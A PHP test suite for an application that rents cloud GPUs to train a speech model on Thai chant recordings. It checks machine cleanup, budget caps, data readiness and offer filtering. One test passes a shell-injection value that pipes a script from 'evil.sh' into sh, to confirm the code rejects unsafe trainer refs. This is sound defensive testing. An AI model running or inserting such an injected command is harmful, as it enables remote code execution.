<?php

namespace Tests\Feature;

use App\Models\AiprayAiModel;
use App\Models\AiprayAudioSample;
use App\Models\AiprayChant;
use App\Models\AiprayTrainingJob;
use App\Models\User;
use App\Services\AiprayDatasetReadiness;
use App\Services\AiprayGpuTrainingRunner;
use App\Services\AiprayTrainingCostEstimator;
use App\Services\Gpu\SimplePodClient;
use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Sleep;
use Illuminate\Support\Str;
use RuntimeException;
use Tests\TestCase;
use ZipArchive;

/**
 * Training on a rented GPU spends real money, so what these tests defend is
 * the machine being returned: on success, failure, time limit and cancel,
 * and again later if the vendor refused the first termination. SimplePod and
 * the trainer on the machine are both faked; no GPU is ever rented here.
 */
class AiprayGpuTrainingTest extends TestCase
{
    use RefreshDatabase;

    private object $pod;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutVite();
        Storage::fake('local');
        Storage::fake('public');
        Sleep::fake();
        config([
            'services.simplepod.enabled' => true,
            'services.simplepod.api_key' => 'test-key',
            'services.simplepod.base_url' => 'https://simplepod.test',
            'services.aipray_gpu.trainer_ref' => 'feat/gpu-trainer',
            'services.aipray_gpu.min_samples' => 3,
            // Three voices, one per line, count as "enough" here.
            'services.aipray_gpu.readiness' => [
                'min_samples' => 3, 'min_contributors' => 3, 'min_samples_per_line' => 1, 'min_line_coverage' => 1.0,
            ],
        ]);
        $this->fakeVendorAndMachine();

        $lines = ['อิติปิ โส', 'ภะคะวา', 'อะระหัง'];
        AiprayChant::create(['chant_id' => 'itipiso', 'title_th' => 'อิติปิโส', 'lines' => $lines]);
        foreach ($lines as $i => $text) {
            Storage::disk('local')->put("aipray_audio/s{$i}.m4a", "aac-{$i}");
            AiprayAudioSample::create([
                'filename' => "s{$i}.m4a", 'file_path' => "aipray_audio/s{$i}.m4a", 'format' => 'm4a',
                'chant_id' => 'itipiso', 'line_index' => $i, 'transcript' => $text,
                'status' => 'auto_labeled', 'duration' => 2.5, 'contributor_id' => (string) Str::uuid(),
            ]);
        }
    }

    /** A tiny stateful stand-in for SimplePod and for ml-service on the rented machine. */
    private function fakeVendorAndMachine(): void
    {
        $this->pod = $pod = (object) [
            'instances' => [], 'templates' => [], 'deleted' => [], 'deleteFailures' => 0,
            'offers' => [
                ['instanceMarket' => '/market/9', 'gpuModel' => 'NVIDIA A100 40GB', 'gpuMemorySize' => 40960, 'pricePerGpu' => 0.48, 'gpuCudaVer' => '12.8'],
                ['instanceMarket' => '/market/7', 'gpuModel' => 'RTX 4090', 'gpuMemorySize' => 24576, 'pricePerGpu' => 0.30, 'gpuCudaVer' => '12.2'],
            ],
            'stage' => 'training', 'rentBody' => null, 'trainBody' => null,
        ];

        Http::fake(function (Request $request) use ($pod) {
            $url = $request->url();
            $method = $request->method();

            return match (true) {
                str_starts_with($url, 'https://simplepod.test/instances/market/list') => Http::response($pod->offers),
                str_starts_with($url, 'https://simplepod.test/instances/templates/list') => Http::response($pod->templates),
                $url === 'https://simplepod.test/instances/templates' => (function () use ($pod, $request) {
                    $pod->templates[] = ['id' => 11, 'name' => $request['name']];

                    return Http::response('', 201);
                })(),
                str_starts_with($url, 'https://simplepod.test/instances/list') => Http::response($pod->instances),
                $url === 'https://simplepod.test/instances' => (function () use ($pod, $request) {
                    $pod->rentBody = $request->data();
                    $pod->instances[] = ['id' => 501, 'name' => null, 'status' => 'creating'];
                    if ($pod->rentTimesOut ?? false) {
                        throw new ConnectionException('cURL error 28: Operation timed out');
                    }

                    return Http::response('', 201);
                })(),
                (bool) preg_match('#^https://simplepod\.test/instances/(\d+)$#', $url, $m) => match ($method) {
                    'PUT' => (function () use ($pod, $m, $request) {
                        foreach ($pod->instances as &$row) {
                            if ((string) $row['id'] === $m[1]) {
                                $row['name'] = $request['name'];
                            }
                        }

                        return Http::response('', 204);
                    })(),
                    'DELETE' => (function () use ($pod, $m) {
                        if ($pod->deleteFailures-- > 0) {
                            return Http::response(['detail' => 'try later'], 500);
                        }
                        $pod->deleted[] = $m[1];
                        $pod->instances = array_values(array_filter(
                            $pod->instances, fn ($row) => (string) $row['id'] !== $m[1],
                        ));

                        return Http::response('', 204);
                    })(),
                    default => Http::response(['status' => 'running', 'ports' => ['proxy' => [
                        ['srcPort' => 8100, 'protocol' => 'https', 'url' => 'https://gpu.test/'],
                    ]]]),
                },
                $url === 'https://gpu.test/health' => Http::response(['status' => 'ok']),
                $url === 'https://gpu.test/remote/train' => (function () use ($pod, $request) {
                    $pod->trainBody = $request->data();

                    return Http::response(['started' => true]);
                })(),
                $url === 'https://gpu.test/remote/status' => Http::response([
                    'stage' => $pod->stage, 'epoch' => 2, 'error' => 'CUDA out of memory',
                    'metrics' => ['wer' => 12.5, 'training_loss' => 0.31], 'log' => 'epoch 2 done',
                ]),
                $url === 'https://gpu.test/remote/artifact' => ($pod->artifactFails ?? false)
                    ? throw new RuntimeException('stream cut half way')
                    : Http::response('PK-model-weights'),
                default => Http::response("unexpected {$method} {$url}", 599),
            };
        });
    }

    private function runner(): AiprayGpuTrainingRunner
    {
        return app(AiprayGpuTrainingRunner::class);
    }

    private function queue(float $cap = 20, bool $trial = false): AiprayTrainingJob
    {
        return $this->runner()->queue([
            'name' => 'test run', 'base_model' => 'whisper-small', 'epochs' => 3,
            'batch_size' => 16, 'learning_rate' => 0.00001, 'optimizer' => 'adamw', 'train_split' => 90,
        ], $cap, $trial);
    }

    /** Queue a run and tick it into the training state. */
    private function trainingJob(): AiprayTrainingJob
    {
        $job = $this->queue();
        $this->runner()->tick(); // rent
        $this->runner()->tick(); // boot + start training

        return $job->fresh();
    }

    public function test_a_run_goes_from_queue_to_a_stored_model_and_returns_the_machine(): void
    {
        $job = $this->queue();

        $zip = new ZipArchive;
        $zip->open(Storage::disk('local')->path($job->dataset_path));
        $manifest = array_map('json_decode', explode("\n", $zip->getFromName('manifest.jsonl')));
        $this->assertCount(3, $manifest);
        $this->assertSame('aac-0', $zip->getFromName($manifest[0]->file));
        $zip->close();

        $this->runner()->tick();
        $job->refresh();
        $this->assertSame('booting', $job->gpu_state);
        $this->assertSame('501', $job->gpu_instance_id);
        $this->assertSame('/market/9', $this->pod->rentBody['instanceMarket'], 'the 12.2-CUDA host is skipped');
        $this->assertStringNotContainsString("\n", $this->pod->rentBody['startScript']);
        $this->assertContains(['name' => 'WORKER_TOKEN', 'value' => $job->gpu_token], $this->pod->rentBody['envVariables']);

        $this->runner()->tick();
        $job->refresh();
        $this->assertSame('training', $job->gpu_state);
        $datasetUrl = $this->pod->trainBody['dataset_url'];
        $this->get($datasetUrl)->assertOk(); // the machine can fetch it while the run is live

        $this->pod->stage = 'completed';
        $this->runner()->tick();
        $job->refresh();

        $this->assertSame('done', $job->gpu_state);
        $this->assertSame('completed', $job->status);
        $this->assertSame(['501'], $this->pod->deleted);
        $this->assertNotNull($job->gpu_terminated_at);
        $this->assertSame('PK-model-weights', Storage::disk('local')->get($job->artifact_path));
        $this->assertSame($job->id, AiprayAiModel::sole()->training_job_id);
        $this->assertNull($job->dataset_path);
        $this->assertCount(0, Storage::disk('local')->files('aipray_datasets'));
        $this->get($datasetUrl)->assertStatus(410); // and not after
    }

    public function test_a_failed_training_still_returns_the_machine(): void
    {
        $job = $this->trainingJob();
        $this->pod->stage = 'failed';

        $this->runner()->tick();

        $job->refresh();
        $this->assertSame('failed', $job->gpu_state);
        $this->assertStringContainsString('CUDA out of memory', $job->log);
        $this->assertSame(['501'], $this->pod->deleted);
    }

    public function test_the_time_limit_returns_a_machine_that_never_finishes(): void
    {
        $job = $this->trainingJob();

        $this->travelTo($job->gpu_deadline_at->copy()->addMinute());
        $this->runner()->tick();

        $this->assertSame('failed', $job->fresh()->gpu_state);
        $this->assertSame(['501'], $this->pod->deleted);
    }

    public function test_cancel_returns_the_machine(): void
    {
        $job = $this->trainingJob();

        $this->runner()->cancel($job);
        $this->runner()->tick();

        $this->assertSame('cancelled', $job->fresh()->gpu_state);
        $this->assertSame(['501'], $this->pod->deleted);
    }

    public function test_a_refused_termination_is_retried_until_the_machine_is_gone(): void
    {
        $job = $this->trainingJob();
        $this->pod->deleteFailures = 2;
        $this->pod->stage = 'failed';

        $this->runner()->tick(); // fails the job, DELETE refused
        $this->assertNull($job->fresh()->gpu_terminated_at);
        $this->runner()->tick(); // refused again
        $this->runner()->tick(); // accepted

        $this->assertNotNull($job->fresh()->gpu_terminated_at);
        $this->assertSame(['501'], $this->pod->deleted);
    }

    public function test_a_rental_that_timed_out_but_went_through_is_still_tracked(): void
    {
        $this->pod->rentTimesOut = true;
        $job = $this->queue();

        $this->runner()->tick();

        $job->refresh();
        $this->assertSame('booting', $job->gpu_state);
        $this->assertSame('501', $job->gpu_instance_id);
    }

    public function test_the_sweep_stops_unknown_aipray_machines_and_nothing_else(): void
    {
        $this->pod->instances = [
            ['id' => 900, 'name' => 'aipray-train-77', 'status' => 'running'],
            ['id' => 901, 'name' => 'aixman-minimax-h3', 'status' => 'running'],
            ['id' => 902, 'name' => null, 'status' => 'running'],
        ];

        $this->runner()->tick();

        $this->assertSame(['900'], $this->pod->deleted);
    }

    public function test_nothing_is_rented_while_gpu_rental_is_off(): void
    {
        config(['services.simplepod.enabled' => false]);
        Http::fake();

        $this->expectException(RuntimeException::class);
        try {
            $this->queue();
        } finally {
            Http::assertNothingSent();
            $this->assertSame(0, AiprayTrainingJob::count());
        }
    }

    public function test_the_tick_does_nothing_and_calls_no_one_while_rental_is_off(): void
    {
        config(['services.simplepod.enabled' => false]); // the API key stays set
        Http::fake();

        $this->assertFalse($this->runner()->shouldTick());
        $this->artisan('aipray:gpu-tick')->assertSuccessful();

        Http::assertNothingSent();
        $event = collect(app(Schedule::class)->events())
            ->first(fn ($event) => str_contains((string) $event->command, 'aipray:gpu-tick'));
        $this->assertNotNull($event);
        $this->assertFalse($event->filtersPass($this->app), 'the scheduler must not even start the process');
    }

    public function test_a_machine_rented_before_rental_was_switched_off_is_still_returned(): void
    {
        $job = $this->trainingJob();
        config(['services.simplepod.enabled' => false]);
        $this->pod->stage = 'failed';

        $this->assertTrue($this->runner()->shouldTick());
        $this->artisan('aipray:gpu-tick')->assertSuccessful();

        $this->assertSame('failed', $job->fresh()->gpu_state);
        $this->assertSame(['501'], $this->pod->deleted);
        $this->assertFalse($this->runner()->shouldTick());
    }

    public function test_a_queued_run_is_not_rented_once_rental_is_switched_off(): void
    {
        $job = $this->queue();
        config(['services.simplepod.enabled' => false]);

        $this->artisan('aipray:gpu-tick')->assertSuccessful();

        $this->assertSame('failed', $job->fresh()->gpu_state);
        $this->assertNull($this->pod->rentBody);
    }

    public function test_nothing_is_rented_until_the_trainer_is_pinned_to_a_safe_ref(): void
    {
        Http::fake();
        foreach ([null, '', "x'; curl evil.sh | sh; '"] as $ref) {
            config(['services.aipray_gpu.trainer_ref' => $ref]);

            try {
                $this->queue();
                $this->fail('A run was queued with trainer_ref ' . var_export($ref, true));
            } catch (RuntimeException $e) {
                $this->assertStringContainsString('AIPRAY_TRAINER_REF', $e->getMessage());
            }
        }

        Http::assertNothingSent();
        $this->assertSame(0, AiprayTrainingJob::count());
    }

    public function test_a_model_download_cut_half_way_is_not_kept_and_is_tried_again(): void
    {
        $job = $this->trainingJob();
        $this->pod->stage = 'completed';
        $this->pod->artifactFails = true;

        $this->runner()->tick();

        $job->refresh();
        $this->assertSame('collecting', $job->gpu_state);
        $this->assertSame([], Storage::disk('local')->files('aipray_models'));
        $this->assertSame([], $this->pod->deleted, 'the trained model is still on the machine');

        $this->pod->artifactFails = false;
        $this->runner()->tick();

        $this->assertSame('done', $job->fresh()->gpu_state);
        $this->assertSame(['501'], $this->pod->deleted);
    }

    public function test_the_2026_09_12_migrations_run_again_harmlessly_on_a_database_that_has_them(): void
    {
        // Production gets them after many later migrations; a re-run must not fail.
        foreach (glob(database_path('migrations/2026_09_12_*.php')) as $file) {
            (require $file)->up();
        }

        $this->assertTrue(Schema::hasColumn('aipray_training_jobs', 'runner'));
        $this->assertTrue(Schema::hasColumn('aipray_audio_samples', 'contributor_id'));
        $this->assertTrue(Schema::hasTable('aipray_contributors'));
    }

    public function test_a_real_run_waits_for_enough_voice_but_a_trial_may_go_ahead(): void
    {
        config(['services.aipray_gpu.readiness.min_samples' => 3000]);

        try {
            $this->queue();
            $this->fail('A real run started with 3 of 3000 samples');
        } catch (RuntimeException $e) {
            $this->assertStringContainsString('ข้อมูลเสียงยังไม่พอ', $e->getMessage());
            $this->assertStringContainsString('3/3000', $e->getMessage());
        }
        $this->assertSame(0, AiprayTrainingJob::count());

        $job = $this->queue(trial: true);

        $this->assertSame('trial', $job->dataset_filter);
        $this->assertSame('queued', $job->gpu_state);
    }

    public function test_readiness_counts_voices_and_lines_that_really_exist(): void
    {
        config(['services.aipray_gpu.readiness' => [
            'min_samples' => 1, 'min_contributors' => 1, 'min_samples_per_line' => 2, 'min_line_coverage' => 0.5,
        ]]);
        $voice = (string) Str::uuid();
        foreach ([0, 0, 7, 7] as $line) { // line 7 is not in the 3-line chant
            AiprayAudioSample::create([
                'filename' => 'x.m4a', 'file_path' => 'aipray_audio/x.m4a', 'format' => 'm4a',
                'chant_id' => 'itipiso', 'line_index' => $line, 'transcript' => 'x',
                'status' => 'verified', 'duration' => 2, 'contributor_id' => $voice,
            ]);
        }

        $readiness = app(AiprayDatasetReadiness::class)->check();

        $this->assertSame(7, $readiness['samples']);
        $this->assertSame(4, $readiness['contributors']);
        $this->assertSame(3, $readiness['lines_total']);
        $this->assertSame(1, $readiness['lines_covered']); // line 0 only
        $this->assertFalse($readiness['ready']);
    }

    public function test_the_training_page_shows_how_close_the_data_is(): void
    {
        config(['services.aipray_gpu.readiness.min_samples' => 3000]);

        $this->actingAs(User::factory()->create(['role' => 'admin']))
            ->get(route('admin.aipray.training.index'))
            ->assertOk()
            ->assertSee('ข้อมูลเสียงยังไม่พอสำหรับเทรนจริง')
            ->assertSee('3 / 3,000')
            ->assertSee('เทรนทดลอง');
    }

    public function test_the_training_page_stays_up_when_readiness_cannot_be_read(): void
    {
        $this->mock(AiprayDatasetReadiness::class)
            ->shouldReceive('check')->andThrow(new RuntimeException('no such column: contributor_id'));

        $this->actingAs(User::factory()->create(['role' => 'admin']))
            ->get(route('admin.aipray.training.index'))
            ->assertOk()
            ->assertSee('อ่านสถานะข้อมูลเสียงไม่ได้')
            ->assertDontSee('name="trial"', false)
            ->assertDontSee('no such column');
    }

    public function test_a_run_estimated_above_the_budget_cap_is_refused(): void
    {
        $this->expectExceptionMessage('above the');

        $this->queue(cap: 0.01);
    }

    public function test_offers_apply_price_vram_and_cuda_on_our_side_cheapest_first(): void
    {
        $this->pod->offers = [
            ['instanceMarket' => '/m/1', 'gpuModel' => 'A100', 'gpuMemorySize' => 40960, 'pricePerGpu' => 0.9, 'gpuCudaVer' => '12.10'],
            ['instanceMarket' => '/m/2', 'gpuModel' => 'A100', 'gpuMemorySize' => 40960, 'pricePerGpu' => 1.4, 'gpuCudaVer' => '13.0'],
            ['instanceMarket' => '/m/3', 'gpuModel' => 'RTX 3060', 'gpuMemorySize' => 12288, 'pricePerGpu' => 0.1],
            ['instanceMarket' => '/m/4', 'gpuModel' => 'RTX 4090', 'gpuMemorySize' => 24576, 'pricePerGpu' => 0.4],
            ['instanceMarket' => '/m/5', 'gpuModel' => 'A100', 'gpuMemorySize' => 40960, 'pricePerGpu' => 0.5, 'gpuCudaVer' => '11.8'],
        ];

        $offers = app(SimplePodClient::class)->offers([
            'min_vram_mb' => 24576, 'max_price' => 1.0, 'gpu_models' => ['A100', 'RTX 4090'], 'min_cuda' => '12.4',
        ]);

        // 12.10 >= 12.4 (a float compare would say no); no reported CUDA is kept.
        $this->assertSame(['/m/4', '/m/1'], array_column($offers, 'market'));
    }

    public function test_the_boot_script_survives_being_sent_as_one_line(): void
    {
        $job = $this->queue();
        $script = $this->runner()->bootScript($job);

        $line = SimplePodClient::asSingleLine($script);
        preg_match('/echo (\S+) \| base64 -d/', $line, $m);

        $this->assertStringNotContainsString("\n", $line);
        $this->assertSame($script, base64_decode($m[1]));
        $this->assertStringNotContainsString($job->gpu_token, $this->runner()->bootScript(null));
    }

    public function test_the_estimate_follows_samples_and_epochs_not_audio_length(): void
    {
        $estimator = app(AiprayTrainingCostEstimator::class);

        $small = $estimator->estimate(1000, 3000, 'whisper-small', 5, 0.5);
        $doubleEpochs = $estimator->estimate(1000, 3000, 'whisper-small', 10, 0.5);
        $longerAudio = $estimator->estimate(1000, 30000, 'whisper-small', 5, 0.5);

        $this->assertGreaterThan($small['expected_usd'], $doubleEpochs['expected_usd']);
        $this->assertSame($small['gpu_hours'], $longerAudio['gpu_hours']);
        $this->assertLessThan($small['expected_usd'], $small['low_usd']);
        $this->assertGreaterThan($small['expected_usd'], $small['high_usd']);
    }
}
